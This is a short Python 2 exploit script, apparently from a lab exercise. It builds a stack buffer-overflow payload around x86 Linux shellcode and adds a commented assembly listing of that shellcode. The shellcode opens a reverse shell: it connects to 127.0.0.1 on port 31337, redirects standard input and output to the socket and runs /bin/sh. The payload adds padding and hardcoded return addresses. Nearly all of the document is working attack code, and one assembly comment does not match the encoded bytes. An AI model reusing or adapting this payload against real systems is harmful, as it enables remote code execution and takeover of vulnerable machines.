shellcode =("\x31\xc0\x83\xc0\x66\x31\xdb\x43\x31\xc9\x51\x41\x51\x41\x51\x89\xe1\xcd\x80\x89\xc2\xb8\x90\x11\x11\x12\x2d\x11\x11\x11\x11\x50\x66\x68\x7a\x69\x31\xc9\x83\xc1\x02\x66\x51\x89\xe7\x31\xdb\x83\xc3\x10\x53\x57\x52\x31\xc0\x83\xc0\x66\x31\xdb\x83\xc3\x03\x89\xe1\xcd\x80\x31\xc9\x31\xc0\x83\xc0\x3f\x89\xd3\xcd\x80\x31\xc0\x83\xc0\x3f\x89\xd3\xfe\xc1\xcd\x80\x31\xc0\x83\xc0\x3f\x89\xd3\xfe\xc1\xcd\x80\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80")






print shellcode+"A"*(2048-len(shellcode))+"\x58\xb7\xfe\xbf"+"\x6c\xbf\xfe\xbf"




'''
.global myfunc
myfunc:
	
	;create a socket  socket(AF_INET, SOCK_STREAM,0)
	xor %eax,%eax	<-store the system call number in %eax
	add $0x66,%eax  <-system call of socket is 102
	
	xor %ebx,%ebx	<-%ebx is the first parameter in socket call function
			 ;which determines which socket function to invoke
	inc %ebx	<-the function to invode is sys_socket (1)
	
	xor %ecx,%ecx	<- %ecx stores the arguments needed in the function in %ebx
			;the function is socket(int domain, int type, int protocol)
			; domain = AF_INET, type = SOCK_STREAM, protocol = TCP
	push %ecx
	inc %ecx	<-SOCK_STREAM = 1
	push %ecx
	inc %ecx	<-AF_INET = 2
	push %ecx
	mov %esp,%ecx	
	int $0x80

	mov %eax,%edx	<-save the return socket
	;call the function 
	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	mov $0x12111190,%eax
	sub $0x11111111,%eax <-local address = 127.0.0.1
	push %eax

	pushw $0x697a	<-port = 31337 (in byte reverse order)
	xor %ecx,%ecx
	add $0x02,%ecx	<-AF_INET = 2
	pushw %cx	
	movl %esp,%edi
	xor %ebx,%ebx
	add $0x10,%ebx	<-socklen_t
	pushl %ebx
	pushl %edi
	pushl %edx

	xor %eax,%eax
	add $0x66,%eax	<-system call of socket is 102
	xor %ebx,%ebx
	add $0x3,%ebx	<-the function to invode is connect(3)
	mov %esp,%ecx
	
	int $0x80
	xor %ecx,%ecx
	
	;stdin
	xor %eax,%eax
	add $0x3f,%eax		<-syscall 63 dup2
				;int dup2(int oldfd, int newfd);
	mov %edx,%ebx		<-client socket file descriptor
	int $0x80

	;stdout
	xor %eax,%eax
	add $0x3f,%eax		<-syscall 63 dup2
	mov %edx,%ebx		<-client socket file descriptor
	inc %cl			<-stdout file descriptor = 1
	int $0x80

	;stderr	
	xor %eax,%eax
	add $0x3f,%eax		<-syscall 63 dup2
	mov %edx,%ebx		<-client socket file descriptor
	add $0x2,%ecx		<-stderr file descriptor:2
	int $0x80

	;invoke a system call through int 0x80 to open up a shell
	xor %eax,%eax
	xor %edx,%edx
	push %eax
	push $0x68732f2f	<-/bin//sh
	push $0x6e69622f	

	mov %esp,%ebx
	push %eax
	push %ebx
	mov %esp,%ecx

	xor %eax,%eax
	add $0xb,%eax	
	int $0x80

	xor %eax,%eax
	add $0x1,%eax
	int $0x80
'''
